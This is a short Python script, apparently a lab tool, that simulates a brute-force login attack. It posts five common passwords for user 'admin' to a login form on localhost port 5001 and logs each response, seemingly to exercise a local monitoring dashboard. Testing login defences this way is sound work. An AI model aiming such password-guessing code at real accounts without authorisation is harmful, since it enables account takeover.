import requests
import time

# CONFIGURATION
# UPDATED: Port 5001 to match your dashboard
TARGET_URL = "http://localhost:5001/login"
USERNAME = "admin"
PASSWORD_LIST = ["123456", "password", "admin123", "qwerty", "letmein"]
DELAY_SECONDS = 0.5  # Faster delay for testing


def run_bruteforce():
    print(f"[*] Starting Brute Force Simulation against {TARGET_URL}")
    print(f"[*] Target User: {USERNAME}\n")

    for password in PASSWORD_LIST:
        try:
            # Construct payload
            payload = {'username': USERNAME, 'password': password}

            # Send POST request
            response = requests.post(TARGET_URL, data=payload)

            # Log the attempt
            # 200 = Success, 401 = Failed
            status_msg = "SUCCESS" if response.status_code == 200 else "FAILED"
            print(f"[ATTEMPT] Pass: {password:<10} | Status: {response.status_code} ({status_msg})")

            # Wait to simulate attack timing
            time.sleep(DELAY_SECONDS)

        except requests.exceptions.ConnectionError:
            print(f"[!] Connection failed to {TARGET_URL}. Is app.py running?")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    print("\n[*] Brute force simulation complete.")


if __name__ == "__main__":
    run_bruteforce()